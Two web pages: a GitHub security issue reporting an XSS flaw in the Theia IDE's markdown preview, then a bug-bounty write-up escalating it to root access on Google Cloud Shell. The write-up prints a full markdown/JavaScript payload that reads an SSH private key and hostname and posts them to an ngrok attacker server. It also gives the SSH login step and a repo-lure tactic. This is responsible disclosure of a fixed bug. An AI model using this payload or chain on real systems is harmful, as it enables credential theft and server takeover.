=== Content from github.com_6a97ac14_20250119_111715.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-theia%2Ftheia%2Fissues%2F7954)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-theia%2Ftheia%2Fissues%2F7954)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=eclipse-theia%2Ftheia)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-theia](/eclipse-theia)
/
**[theia](/eclipse-theia/theia)**
Public

* [Notifications](/login?return_to=%2Feclipse-theia%2Ftheia) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Feclipse-theia%2Ftheia)
* [Star
   20.2k](/login?return_to=%2Feclipse-theia%2Ftheia)

* [Code](/eclipse-theia/theia)
* [Issues
  1.5k](/eclipse-theia/theia/issues)
* [Pull requests
  25](/eclipse-theia/theia/pulls)
* [Discussions](/eclipse-theia/theia/discussions)
* [Actions](/eclipse-theia/theia/actions)
* [Projects
  1](/eclipse-theia/theia/projects)
* [Wiki](/eclipse-theia/theia/wiki)
* [Security](/eclipse-theia/theia/security)
* [Insights](/eclipse-theia/theia/pulse)

Additional navigation options

* [Code](/eclipse-theia/theia)
* [Issues](/eclipse-theia/theia/issues)
* [Pull requests](/eclipse-theia/theia/pulls)
* [Discussions](/eclipse-theia/theia/discussions)
* [Actions](/eclipse-theia/theia/actions)
* [Projects](/eclipse-theia/theia/projects)
* [Wiki](/eclipse-theia/theia/wiki)
* [Security](/eclipse-theia/theia/security)
* [Insights](/eclipse-theia/theia/pulse)

# [security] XSS vulnerability in markdown preview #7954

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[[security] XSS vulnerability in markdown preview](#top)#7954Copy linkAssignees [![caseyflynn-google](https://avatars.githubusercontent.com/u/23463108?s=64&v=4)](/caseyflynn-google)Labels[securityissues related to security](https://github.com/eclipse-theia/theia/issues?q=state%3Aopen%20label%3A%22security%22)issues related to security![@caseyflynn-google](https://avatars.githubusercontent.com/u/23463108?v=4&size=80)
## Description

![@caseyflynn-google](https://avatars.githubusercontent.com/u/23463108?v=4&size=48)[caseyflynn-google](https://github.com/caseyflynn-google)opened [on Jun 3, 2020](https://github.com/eclipse-theia/theia/issues/7954#issue-630295523)
### Bug Description: XSS vulnerability in markdown preview

The Markdown Preview can exploited to execute arbitrary code.

### Steps to Reproduce:

1. Create markdown file and append the following text: <style onload="alert(0)">
2. Save and close the file.
3. Right click the file and select Open With -> Preview
4. Observe the alert has fired.

The root cause of the vulnerability is the current usage of [markdown-it](https://github.com/markdown-it/markdown-it) to [render html](https://github.com/eclipse-theia/theia/blob/fcddb3b78558678f0eff8bc4abeeb4ab046a40d0/packages/preview/src/browser/markdown/markdown-preview-handler.ts#L217) then subsequently adding the output to the DOM via [innerHtml](https://github.com/eclipse-theia/theia/blob/fcddb3b78558678f0eff8bc4abeeb4ab046a40d0/packages/preview/src/browser/markdown/markdown-preview-handler.ts#L56) without sanitizing. Moreover, there are several potential xss sinks within the Theia code base that could potentially be exploited in a similar fashion (e.g. [innerHtml](https://github.com/eclipse-theia/theia/blob/fcddb3b78558678f0eff8bc4abeeb4ab046a40d0/packages/plugin-ext/src/main/browser/plugin-icon-theme-service.ts#L165), [dangerouslySetInnerHtml](https://github.com/eclipse-theia/theia/blob/1ca3ec37c079a6b316278cf292609653e57b8151/packages/messages/src/browser/notification-component.tsx#L76)). Would the community be open to accepting contributions to mitigate these vulnerabilities, and accompanying lint rules that would bar future usages of xss sinks?

### Additional Information

* Operating System: Linux
* Theia Version: 1.2.0
👀1
## Metadata

### Assignees

* [![@caseyflynn-google](https://avatars.githubusercontent.com/u/23463108?s=64&v=4)caseyflynn-google](/caseyflynn-google)
### Labels

[securityissues related to security](https://github.com/eclipse-theia/theia/issues?q=state%3Aopen%20label%3A%22security%22)issues related to security
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from omespino.com_bb3e8a6d_20250119_111716.html ===

 [Skip to content](#content) Menu

* [BLOG EN ESPAÑOL](/es)

# [@omespino](/)

## just another security blog.

  Written by [omespino](/author/user-admin/)[October 1, 2020January 7, 2022](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/)
# WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) – $5,000 USD

**[ Update: this writeup was modified to participate in [GCP VRP Prize 2020 Awards](https://security.googleblog.com/2020/03/announcing-our-first-gcp-vrp-prize.html) ]**

[![](/wp-content/uploads/2021/04/vrp-hd.png)](https://g.co/vrp)

**Introduction:**

Hi everyone It’s been a while since my last post (1 year w00t!) but I’m back, I want to tell you a short story about one of my last bug bounties, and how I escalated a simple XSS to a full Google Cloud Shell instance take over as a full administrator (RCE as root)

*This blogpost appeared first in the book [Bug Bounty Write Ups Collection](/bug-bounty-writeups-collection/)*

[![](/wp-content/uploads/2022/01/BBEBANNER-ENG-1024x772.png)](/bug-bounty-writeups-collection/)

**What is Google Cloud Shell?** extracted from [Google Cloud shell landing page:](https://cloud.google.com/shell)

“*Your online development and operations environment
Cloud Shell is an online development and operations environment accessible anywhere with your browser. You can manage your resources with its online terminal preloaded with utilities such as the gcloud command-line tool, kubectl, and more. You can also develop, build, debug, and deploy your cloud-native* apps using the online Cloud Shell Editor.” which actually is an Eclipse Theia editor instance

So Google Cloud Shell basically is a **Linux VM box** with an online editor **Eclipse Theia**, so **what is Ecplise Theia?** extracted from [Theia landing page](https://theia-ide.org/)

*“Eclipse Theia is an extensible platform to develop multi-language Cloud & Desktop IDEs with state-of-the-art web technologies. “*

![Theia IDE Screenshot](https://theia-ide.org/theia-screenshot.jpg)

So since Theia is Open Source, [Theia’s GitHub repository](https://github.com/eclipse-theia/theia) is a very good place to start investigating

**Investigation:**

So the plan was basically:

Look into [Theia’s GitHub repository](https://github.com/eclipse-theia/theia) issues and filter those with a **security tag,** then analyze all issues.

 **It was my lucky day**, an XSS on markdown preview apparently reported by a Googler, and also a working POC, w00t?!

![](/wp-content/uploads/2020/11/image-1024x872.png)
![](/wp-content/uploads/2020/11/image-2-1024x783.png)

After that immediately I tested that POC on <https://shell.cloud.google.com/> and it worked like a charm!!

![](/wp-content/uploads/2020/11/image-3-1024x187.png)

So, at this point, Google would reward the alert(0) box, **they do not need you to explain to them why XSS is a big deal as other companies, right?** Anyway I wanted to push myself to escalate this XSS to full instance take over, so was time to escalate this simple alert box.

**Escalation:**So, my first taught was that if the XSS was able to run in the same context that all files, maybe I can run a simple GET to extract any “local” file, but it was not that easy, also that I noticed that the UI Theia editor part for the editor was running in some instance that is different for the actual “command line terminal” instance

So luckily the UI Theia instance has the private key in the root of the instance, and we just needed to navigate to a new workspace and set / (root) to see that key, anyway sadly there is no screenshot for that, but you have my word, once loaded the workspace “/” you can see that “id\_cloudshell” file

![](/wp-content/uploads/2020/11/image-4-1024x844.png)

So in the end, after some playing with the “Download” files button and checking all the traffic in Chrome DevTools, the solution for reading those files via HTTP GET on javascript was using these 2 endpoints:

1.- First, ****‘https://’ + location.host + ‘/files/?uri=’****
This to get the id for any uri, per example ***/files/?uri=file:///etc/hosts***, responses something like ***{id: “5147084a-XXXX-43a9-afb0-bb8a126f1162”}***

2.- And then use **https://’ + location.host + ‘/files/download/?id=’** with the id ***/files/download/?id=5147084a-*XXXX*-43a9-afb0-bb8a126f1162*** and getting the actual file content

**Putting all together :**

Google Cloud Shell has an option to import GitHub repositories into Google Cloud shell instances [with 1 click](https://cloud.google.com/shell/docs/open-in-cloud-shell), so the main idea was:

1.- Create a [malicious git repository](https://github.com/omespino/gcs_instace_takeover/blob/master/readme.md) to store that malicious script in the read.md file

2.- We can also put the open in google cloud shell button in the same file md file

![](/wp-content/uploads/2020/11/image-5-1024x903.png)

3.- Then trick the user to import that git repository to his google cloud shell instance

4.- Once the read.md file renders we stole the **/etc/hosts** file to construct the public domain to access that cloudshell instance and also the private key **/../id\_cloudshell**

*the hostname is **“cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX”**, we delete the cs-6000 part and append .cloudshell.dev, getting something like this **devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev*** that is public accessible for anyone

5.- Since we know that the **root** user is always present user in Linux we can use that to login in via ssh

6.- with ***devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev*** (public domain) we can actually get the IP from ***devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev*** making a ping and then do some port scanning, (after that we discovered that the ssh service was running on **6000 port** )

7.- Profit, knowing the public domain hostname, the ssh port, the user root, and the private key we just needed to login in and run any command that we want
***‘ssh -i id\_cloudshell -p 6000 root@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev‘***

Final read.me file code

![](/wp-content/uploads/2020/12/read.me_file.jpg)
```
# Google VRP testing
Google cloudshell instance take over (as root)

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?page=editor&cloudshell_git_repo=https:%2F%2Fgithub.com%2Fomespino%2Fgcs_instace_takeover.git&cloudshell_open_in_editor=readme.md)

## Getting Started
just need to preview this file to see the magic
<style onload="{
	var file_results = []
	// this scape the container and get the ssh id_cloudshell private key
	read_file('file:///../id_cloudshell')
	// getting the hostname (external connection)
	read_file('file:///etc/hostname') setTimeout(function(){ send_files(file_results) },5000)
	// function to read any file given the path with
        // file protocol per example 'file:///etc/hostname'
	function read_file(file_to_read){
		var container_url = 'https://' + location.host + '/files/?uri='
		var get_file_id_url = container_url + file_to_read console.log(get_file_id_url)
		fetch(get_file_id_url) // convert response to json
			 .then(response => {
			 	return response.json()
			 }).then(json => {
			 	var container_download_url =
                                  'https://' + location.host + '/files/download/?id='
			 	var download_url =
                                  container_download_url + json.id fetch(download_url)
			 	.then(response => { return response.text() }
			 	.then(text => {
			 		console.log(file_to_read + ' '+ text)
			 		file_results.push(file_to_read + ' ' + text)})
			 	})
			}

		function send_files(result){
		// need to set netcat to listen per example nc -lvvv 55555
                let attacker_server = ' https://56051573.ngrok.io'
		fetch(attacker_server, {
			method: 'post', body: JSON.stringify(result)
		})
	}
}">

```

**Extracted from Google VRP’s report: (the actual Google VRP report)**

*Summary: Google cloud shell instance take over (as root)*

Steps to reproduce:

*1.- Setup an SSL server that you own in any port, I will use ngrok + nc combo over port 55555*

*2.- Visit [https://github.com/omespino/gcs\_instace\_takeover](https://www.google.com/url?q=https://github.com/omespino/gcs_instace_takeover&sa=D&usg=AFQjCNG_9gmSNcYeUI0c00qkuBJJKzansA) and click open in Google Cloud Shell*

*3.- Wait to load everything and then click the preview button for the .md files (you need to set up the attacker server that you own before de preview)*

*4.- Receive 2 google vm’s files: ‘/etc/hosts’ and the private key ‘../id\_cloudshell’ (scape the container with ‘../’ )
        4.1: for the private key you need to replace \n for jump lines and save it as ‘id\_cloudshell’
        4.2: the hostname is “cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX”, we delete the cs-6000 part and append .[cloudshell.dev](https://www.google.com/url?q=http://cloudshell.dev&sa=D&usg=AFQjCNF1BD8WAg1OhhHdNMHkYZnWnCusHA), getting something like this [devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev](https://www.google.com/url?q=http://devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev&sa=D&usg=AFQjCNFvjxzIqtt525l-TtFOTXQFe2PWig)*

*5.- login as root on ssh over port 6000
        ‘ssh -i id\_cloudshell -p 6000 root@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev‘*

*6.- w00t!!! now you are r00t! on that google cloudshell instance*

Feb 6, 2020: Sent the report to Google VRP
Feb 6, 2020: Got a message from google that the bug was triaged
Feb 14, 2020: Nice Catch! Bug Accepted (P2)
Feb 20, 2020: $5,000 bounty awarded
Mar 18, 2020: Fixed by Google

Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[Facebook](https://www.facebook.com/sharer/sharer.php?u=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/&display=popup&ref=plugin&src=share_button "Share on Facebook")[Tweet](https://twitter.com/share?url=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/&text=WRITE%20UP%20%E2%80%93%20%5BGoogle%20VRP%20Prize%20update%5D%20GOOGLE%20BUG%20BOUNTY%3A%20XSS%20to%20Cloud%20Shell%20instance%20takeover%20%28RCE%20as%20root%29%20%E2%80%93%20%245%2C000%20USD "Share on Twitter")[LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/ "Share on LinkedIn")Shares176

## 2 thoughts on “WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) – $5,000 USD”

1. ![](https://secure.gravatar.com/avatar/?s=75&d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&r=g) **sikis izle** says:

    [November 13, 2020 at 1:04 pm](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#comment-6772)

   I blog often and I seriously thank you for your content. Jesse Reuben Ediva

   [Reply](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/?replytocom=6772#respond)
2. ![](https://secure.gravatar.com/avatar/?s=75&d=%2Fwp-content%2Fuploads%2F2021%2F07%2Fhacking-glider.jpg&r=g) **film** says:

    [November 22, 2020 at 8:08 pm](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#comment-6814)

   Absolutely composed written content , thanks for information

   [Reply](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/?replytocom=6814#respond)

### Leave a Reply [Cancel reply](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name

Email

Website

## Post navigation

[Previous Post WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance”](/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/)
[Next Post WRITE UP: Google VRP N/A – Sandboxed RCE as root on Apigee API proxies](/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/)

[@OMESPINO](/)

* [BLOG EN ESPAÑOL](/es)


